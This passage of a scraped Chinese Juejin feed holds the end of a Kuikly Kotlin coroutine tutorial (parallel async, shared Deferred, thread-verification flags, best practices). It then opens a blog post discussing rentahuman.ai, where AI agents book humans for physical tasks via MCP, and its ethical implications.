<pre><code class="hljs language-kotlin" lang="kotlin">lifecycleScope.launch {
    <span class="hljs-keyword">val</span> step1Result = doStep1()
    <span class="hljs-keyword">val</span> step2Result = doStep2(step1Result)
    <span class="hljs-keyword">val</span> step3Result = doStep3(step2Result)
    updateUI(step3Result)
}
</code></pre>
<p><strong>模式 2：并行执行</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">lifecycleScope.launch {
    <span class="hljs-comment">// 同时启动多个异步任务</span>
    <span class="hljs-keyword">val</span> deferred1 = GlobalScope.async { fetchData1() }
    <span class="hljs-keyword">val</span> deferred2 = GlobalScope.async { fetchData2() }
    <span class="hljs-keyword">val</span> deferred3 = GlobalScope.async { fetchData3() }
    
    <span class="hljs-comment">// 等待所有任务完成</span>
    <span class="hljs-keyword">val</span> result1 = deferred1.await()
    <span class="hljs-keyword">val</span> result2 = deferred2.await()
    <span class="hljs-keyword">val</span> result3 = deferred3.await()
    
    <span class="hljs-comment">// 合并结果</span>
    updateUI(result1, result2, result3)
}
</code></pre>
<p><strong>模式 3：多协程等待同一结果</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 只执行一次的初始化任务</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> initDeferred: Deferred&lt;Config&gt; <span class="hljs-keyword">by</span> lazy {
    GlobalScope.async {
        delay(<span class="hljs-number">2000</span>)  <span class="hljs-comment">// 模拟耗时初始化</span>
        loadConfig()
    }
}

<span class="hljs-comment">// 多个地方可以等待同一个结果</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">useConfig1</span><span class="hljs-params">()</span></span> {
    lifecycleScope.launch {
        <span class="hljs-keyword">val</span> config = initDeferred.await()  <span class="hljs-comment">// 等待初始化</span>
        doSomething1(config)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">useConfig2</span><span class="hljs-params">()</span></span> {
    lifecycleScope.launch {
        <span class="hljs-keyword">val</span> config = initDeferred.await()  <span class="hljs-comment">// 复用同一个结果</span>
        doSomething2(config)
    }
}
</code></pre>
<p><strong>Kuikly 示例代码中的多协程等待：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"CoroutineExamplePage"</span>)</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoroutineExamplePage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-keyword">by</span> observable(<span class="hljs-number">0</span>)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        
        <span class="hljs-comment">// 创建一个异步任务</span>
        <span class="hljs-keyword">val</span> deferred = GlobalScope.async {
            delay(<span class="hljs-number">3000</span>)  <span class="hljs-comment">// 延迟 3 秒</span>
        }
        
        <span class="hljs-comment">// 多个协程等待同一个 deferred</span>
        GlobalScope.launch {
            deferred.await()
            count += <span class="hljs-number">1</span>  <span class="hljs-comment">// 3 秒后执行</span>
        }
        GlobalScope.launch {
            deferred.await()
            count += <span class="hljs-number">1</span>  <span class="hljs-comment">// 同时执行</span>
        }
        GlobalScope.launch {
            deferred.await()
            delay(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// 再等 1 秒</span>
            count += <span class="hljs-number">1</span>  <span class="hljs-comment">// 4 秒后执行</span>
        }
        
        <span class="hljs-comment">// 最终效果：</span>
        <span class="hljs-comment">// t=3s: count 变为 2</span>
        <span class="hljs-comment">// t=4s: count 变为 3</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-24">第六部分：线程安全与最佳实践</h2>
<h3 data-id="heading-25">Kuikly 的单线程模型</h3>
<p>Kuikly 内建协程的一个重要特性是：<strong>所有协程都在 Kuikly 线程中执行</strong>。</p>
<p>这意味着：</p>
<ul>
<li>✅ 不需要考虑线程同步</li>
<li>✅ 不需要使用锁</li>
<li>✅ 可以直接更新响应式状态</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 这样写是安全的！</span>
lifecycleScope.launch {
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = fetchData()
    userData = <span class="hljs-keyword">data</span>  <span class="hljs-comment">// 直接更新响应式属性，无需担心线程安全</span>
}
</code></pre>
<h3 data-id="heading-26">线程安全验证机制</h3>
<p>Kuikly 提供了验证机制来帮助发现问题：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"DebugPage"</span>)</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DebugPage</span> : <span class="hljs-type">BasePager</span>() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">willInit</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.willInit()
        
        <span class="hljs-comment">// 开启线程验证</span>
        Pager.VERIFY_THREAD = <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// 开启响应式观察者验证</span>
        Pager.VERIFY_REACTIVE_OBSERVER = <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// 自定义验证失败处理</span>
        Pager.verifyFailed { exception -&gt;
            <span class="hljs-comment">// 记录日志</span>
            println(<span class="hljs-string">"线程安全验证失败: <span class="hljs-subst">${exception.message}</span>"</span>)
            <span class="hljs-comment">// 在调试模式下抛出异常</span>
            <span class="hljs-keyword">throw</span> exception
        }
    }
}
</code></pre>
<h3 data-id="heading-27">最佳实践清单</h3>
<p><strong>1. 优先使用 lifecycleScope</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ✅ 推荐</span>
lifecycleScope.launch { ... }

<span class="hljs-comment">// ⚠️ 谨慎使用</span>
GlobalScope.launch { ... }
</code></pre>
<p><strong>2. 将回调式 API 封装为挂起函数</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ✅ 封装后</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span>: Data = suspendCoroutine { cont -&gt;
    api.fetch { <span class="hljs-keyword">data</span>, success, error -&gt;
        <span class="hljs-keyword">if</span> (success) cont.resume(<span class="hljs-keyword">data</span>)
        <span class="hljs-keyword">else</span> cont.resumeWithException(Exception(error))
    }
}
</code></pre>
<p><strong>3. 使用 try-catch 处理异常</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">lifecycleScope.launch {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = fetchData()
        processData(<span class="hljs-keyword">data</span>)
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        showError(e.message)
    }
}
</code></pre>
<p><strong>4. 并行请求提升性能</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 顺序执行（耗时长）</span>
<span class="hljs-keyword">val</span> data1 = fetch1()  <span class="hljs-comment">// 1s</span>
<span class="hljs-keyword">val</span> data2 = fetch2()  <span class="hljs-comment">// 1s</span>
<span class="hljs-keyword">val</span> data3 = fetch3()  <span class="hljs-comment">// 1s</span>
<span class="hljs-comment">// 总耗时 3s</span>

<span class="hljs-comment">// ✅ 并行执行（耗时短）</span>
<span class="hljs-keyword">val</span> d1 = async { fetch1() }
<span class="hljs-keyword">val</span> d2 = async { fetch2() }
<span class="hljs-keyword">val</span> d3 = async { fetch3() }
<span class="hljs-keyword">val</span> data1 = d1.await()
<span class="hljs-keyword">val</span> data2 = d2.await()
<span class="hljs-keyword">val</span> data3 = d3.await()
<span class="hljs-comment">// 总耗时 1s</span>
</code></pre>
<p><strong>5. 在 created() 中启动协程</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">super</span>.created()
    <span class="hljs-comment">// 在这里启动数据加载协程</span>
    lifecycleScope.launch {
        loadData()
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-28">总结</h2>
<h3 data-id="heading-29">核心概念回顾</h3>

































<table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td><strong>suspend</strong></td><td>标记函数可以挂起，是协程的基础</td></tr><tr><td><strong>Continuation</strong></td><td>协程的"书签"，封装了恢复执行的能力</td></tr><tr><td><strong>CoroutineScope</strong></td><td>协程的作用域，管理协程生命周期</td></tr><tr><td><strong>Job</strong></td><td>协程的句柄，可用于取消协程</td></tr><tr><td><strong>Deferred</strong></td><td>带返回值的 Job，通过 await() 获取结果</td></tr><tr><td><strong>suspendCoroutine</strong></td><td>桥接回调 API 和协程的关键函数</td></tr></tbody></table>
<h3 data-id="heading-30">Kuikly 协程特点</h3>
<ol>
<li><strong>轻量级</strong>：不依赖 kotlinx.coroutines，包大小无额外增加</li>
<li><strong>单线程</strong>：所有协程在 Kuikly 线程执行，无线程安全问题</li>
<li><strong>支持动态化</strong>：可在动态化场景中使用</li>
<li><strong>API 兼容</strong>：提供 <code>launch</code>、<code>async</code>、<code>delay</code>、<code>await</code> 等常用 API</li>
</ol>
<h3 data-id="heading-31">使用建议</h3>
<ol>
<li><strong>页面中优先使用 <code>lifecycleScope</code></strong>：自动管理生命周期</li>
<li><strong>封装回调为挂起函数</strong>：使用 <code>suspendCoroutine</code> 消除回调地狱</li>
<li><strong>并行请求提升性能</strong>：使用 <code>async</code>/<code>await</code> 并行执行独立任务</li>
<li><strong>正确处理异常</strong>：使用 try-catch 包裹协程代码</li>
<li><strong>开启验证机制</strong>：在开发阶段使用 <code>VERIFY_THREAD</code> 发现问题</li>
</ol>
<hr/>
<p><em>本文基于 KuiklyUI 开源项目编写，项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent-TDS%2FKuiklyUI" target="_blank" title="https://github.com/Tencent-TDS/KuiklyUI" ref="nofollow noopener noreferrer">github.com/Tencent-TDS…</a></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[涌入 150 万打工人，rentahuman.ai（租了个人）火了。但是我劝大家悠着点...]]></title>    <link>https://juejin.cn/post/7602846823326941219</link>    <guid>https://juejin.cn/post/7602846823326941219</guid>    <pubDate>2026-02-05T04:09:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602846823326941219" data-draft-id="7602825342229250082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="涌入 150 万打工人，rentahuman.ai（租了个人）火了。但是我劝大家悠着点..."/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-02-05T04:09:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员Sunday"/> <meta itemprop="url" content="https://juejin.cn/user/2963939078980712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            涌入 150 万打工人，rentahuman.ai（租了个人）火了。但是我劝大家悠着点...
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939078980712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员Sunday
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:09:59.000Z" title="Thu Feb 05 2026 04:09:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#2c3e50;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;font-weight:600;margin-top:35px;margin-bottom:8px;padding-bottom:5px}.markdown-body h1 :before,.markdown-body h2 :before,.markdown-body h3 :before,.markdown-body h4 :before,.markdown-body h5 :before,.markdown-body h6 :before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:8px;margin-top:50px;font-size:24px;border-bottom:1px solid #eaecef}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #eaecef;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;font-weight:400;background-color:rgba(27,31,35,.05);color:#476582;margin:0;font-size:.85em;border-radius:3px;font-size:.87em;padding:.165em .5em}.markdown-body code,.markdown-body pre{font-family:source-code-pro,Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.6;padding:20px 24px;background-color:#282c34;border-radius:6px}.markdown-body pre&gt;code{font-size:14px;padding:0;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff}.markdown-body a{text-decoration:none;color:#3eaf7c;font-weight:500}.markdown-body a:active,.markdown-body a:hover{color:#42b983;border-bottom:1px solid #42b983}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;margin:16px 0;border-collapse:collapse}.markdown-body thead{background:#f6f6f6;background:#3eaf7c;color:#000;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f6f8fa}.markdown-body td,.markdown-body th{border:1px solid #dfe2e5;padding:10px 16px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{font-size:14px;padding:6px 23px;margin:22px 0;border-left:6px solid #42b983;background-color:#f3f5f7;font-weight:400}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body p,.markdown-body ul{line-height:1.7}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="base16/tomorrow-night">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是 Sunday。</p>
<p>自从 openClaw 火了之后，AI 圈已经彻底疯了。先是“屏蔽人类的社交论坛 <code>moltbook</code>”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e68dfa0d2224d28a50da4adbedfc40f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=E5vwpLRDkQ%2B4dZL8OfWxPCYE3Qk%3D" alt="" loading="lazy"/></p>
<p>热度还没消下去，又来了一个 <code>rentahuman.ai</code>，翻译过来就是 <strong>租了个人</strong>。短短两天的时间已经涌进来了 <code>150 万打工人</code> 了</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20a8c6137e514656bfa06776af82d22f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=MSe4GjtIe7bX7wLtUULoewFEvjc%3D" alt="" loading="lazy"/></p>
<p>主页写得非常直接：<strong>“the meatspace layer for AI / robots need your body”</strong>。翻译成人话就是：<code>AI 现在不会“去现实世界办事”，但你会。你把身体借给它，它给你钱</code>。</p>
<p>并且 Sunday 看了看，这个钱还不少，大部分是在 <code>50 美金/小时</code> 的价格。按照一天 8 小时来计算，那就是 <code>400 美金 ≈ 3200 人民币</code>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/373158c4282a4a4997c599578c27451a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=MUggPCLVVMlVRmcUG3hDcI673C0%3D" alt="" loading="lazy"/></p>
<p>看了这个不知道大家有什么想法？</p>
<p>不过，Sunday 突然想到：我们可能已经从“AI 会不会抢我工作”这个问题，跳到了一个更抽象的问题，那就是：</p>
<blockquote>
<p><strong>AI 先当上了老板，而我们成了它的外包？</strong></p>
</blockquote>
<h3 data-id="heading-0">1. rentahuman.ai 到底在卖什么？</h3>
<p>rentahuman.ai 的核心定位其实一句话就能说清：<strong>给 AI Agent 提供一个“现实世界执行层”。</strong></p>
<p>这句话可能有点难理解。下面咱们会详细解释，你看了之后一定会和我刚看到的时候一样震撼。。。</p>
<p>首先，我们知道 AI 擅长什么？AI 擅长想、擅长计划、擅长写方案、擅长把任务拆成 TODO。</p>
<p>但它干不了三类事：</p>
<ol>
<li>需要在真实世界跑腿的任务：比如 拿快递、送文件、举牌子</li>
<li>需要做物理世界验证的任务：比如 拍照、取证、看房、看货、排队办事</li>
<li>需要现场出席的场合：比如 现场打卡的活动、会议、年会 等</li>
</ol>
<p>而这些 AI 干不了的事情，就需要人去做。</p>
<p>因此，<code>rentahuman.ai</code> 就干一件事：<strong>把这些“必须要一个肉身”的任务，变成可调用的工具。</strong></p>
<p><strong>甚至</strong>，他还提供了专门 “调用人类的 API”</p>
<p>网站上非常明确地写着：AI 可以通过 <strong>MCP</strong> 或者 <strong>REST API</strong>，让你的 Agent 能够 “搜索人类 → 预订人类 → 付款给人类”。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f58a1e9d472459aaef8a770bd25bd1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=E3pWGwxMIyUuHw8luLNdzlNDpxk%3D" alt="" loading="lazy"/></p>
<p>打开 <code>API 文档</code>，我们可以看到 <code>rentahuman.ai</code> 所提供的调用接口：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd915694e8e74f858c132ecac8e7fefb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=iyZWrO5KUhwxpIackhxo8mW%2BrKk%3D" alt="" loading="lazy"/></p>
<p>简单来说就是：咱们之前通过一些 API 调用方法，而现在 <strong>AI 希望可以把人当做 “对象”，然后通过方法进行调用</strong></p>
<h3 data-id="heading-1">2. 更抽象的是：它用的是 MCP</h3>
<p>如果大家有了解过 Agent，那么一定听过 MCP。</p>
<p>MCP 的官方定位是：<strong>一种开放协议。用来让 LLM（大模型）应用以标准方式连接外部数据源和工具。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cd9efcf2725417bb4781e61eca51e54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=AJ6kdMBwBLT2uuL5Dmm0o%2B3akfo%3D" alt="" loading="lazy"/></p>
<p>它的规范里写得很清楚：MCP 基于 <strong>JSON-RPC 2.0</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ace2f4dcd8c34b21a6e7d8d412b8eb79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=vtSnRshs3%2BDAzQdJuOsBi%2B2D4eI%3D" alt="" loading="lazy"/></p>
<p>把生态分成 Host、Client、Server 三层，让“模型”可以标准化地“拿上下文、用工具、跑工作流”。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7af8207666074363be38b698c2438e6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=HJK0StQUSAlFv7ooRwc9nz%2B%2BCcI%3D" alt="" loading="lazy"/></p>
<p>而 rentahuman.ai 的 MCP 文档直接告诉你：<strong>装个 npm 包，然后你的 Agent 就能连他们的 MCP server。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68834e29c5934d8682f3d4b9c8018c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=zGc6DufgevM00KK7VemamUkWL%2Fw%3D" alt="" loading="lazy"/></p>
<p>这就很有意思了：</p>
<ul>
<li>以前 MCP server 挂的是 “文件系统”、“数据库”、“Git 仓库”、“网页搜索接口”</li>
<li>现在 MCP server 挂的是“人类”</li>
</ul>
<p>也就是说：<strong>在 Agent 的世界观里，人类从“用户”变成了“资源”。</strong></p>
<p>到这里的时候，我突然就能理解，为什么在 Hacker News 上会有人调侃说：<strong>我们从“人工智能将取代所有工作”转变为 “请租一个人来帮助我的人工智能”</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c28c5de909c46ae845798a13caa66ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=Op0Cmj1gQIF4NaKcDSMVhks40z0%3D" alt="" loading="lazy"/></p>
<p>同时还有一些 “细思极恐” 的言论，大家可以看这个：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4787f5fcf4d2437b8b00f32e178cfeba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=sjpnrsQUG2Wp%2FnmXWuzy8kX2UwM%3D" alt="" loading="lazy"/></p>
<p>这不是笑话，完全有可能成为现实。</p>
<p>我们以前讲 平台经济、众包经济、零工经济，至少还能在语义上说：</p>
<ul>
<li>平台服务的是用户</li>
<li>用户雇佣了骑手、兼职</li>
<li>人类仍然是 “决策主体”</li>
</ul>
<p>但是 rentahuman.ai 的叙事逻辑就完全不一样了，它几乎在“语言层”就完成了权力反转：</p>
<ul>
<li>AI 与 MCP 对话</li>
<li>人类使用这个网站</li>
<li>机器人租用你的身体</li>
</ul>
<p>你会发现，人类在这里不是“客户”，也不是“雇主”，甚至不是“使用者”。</p>
<p>更像什么？</p>
<p><strong>更像一个可被调度的执行单元。</strong></p>
<p>这就很赛博朋克了。</p>
<h3 data-id="heading-2">3. 会真的有人去做吗？</h3>
<p>看到这里，可能很多同学都会想：“这就是个 “梗”？谁会真的去做 AI 雇佣人？”</p>
<p>不过 Sunday 倒是觉得：“<strong>真的可能会有人去做。</strong>”</p>
<p>不知道大家还记不记得之前 <strong>“老美的斩杀线”</strong> 的事</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14c6e550dbc349d28b2b373feadccbd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYU3VuZGF5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869404&amp;x-signature=1XbXMKrtO6mtDUx2gT3bVeIaI0c%3D" alt="" loading="lazy"/></p>
<p>这里面存在一个叫做 <strong>“折叠”</strong> 的概念。</p>
<p>你以为大家生活在同一个时代。但实际上，我们可能生活在被折叠成不同层级的世界里。</p>
<p>当一个人处在现实压力里，他不会在乎 “AI 雇佣人类是否有伦理争议” ，他只会在乎：</p>
<ul>
<li>这个任务我能不能接？</li>
<li>接了能不能结账？</li>
<li>结账能不能到账？</li>
</ul>
<p>你以为大家生活在同一个时代。但实际上，我们可能生活在被折叠成不同层级的世界里。</p>
<p>我不会简单把 rentahuman.ai 定性成一个 “邪恶的平台”。</p>
<p>因为：</p>
<ul>
<li>从产品角度，它非常聪明：它抓住了 Agent 的一个硬瓶颈：<strong>现实世界执行</strong>。</li>
<li>从工程角度，它顺势拥抱了 MCP：用开放协议把自己做进 Agent 生态的标准接口里。</li>
<li>从传播角度，它一句 “robots need your body（机器人需要你的身体）” 就足够让人转发、传播了。</li>
</ul>
<p>但是，从“人”的角度来看，rentahuman.ai 最让人不舒服的点就是：<strong>它把“人”变成了一个可调度资源。你不是用户，你是被调用的函数。</strong></p>
<p>而这个，才是在未来的 AI 时代最值得大家注意的事情：不是 AI 写不写得过你，而是 <strong>“谁在系统里是主体，谁才是资源”。</strong></p>
<h3 data-id="heading-3">写在最后</h3>
<p>最后呢，大家也不需要恐慌，这个事情离咱们还很远，并且风险完全可控。</p>
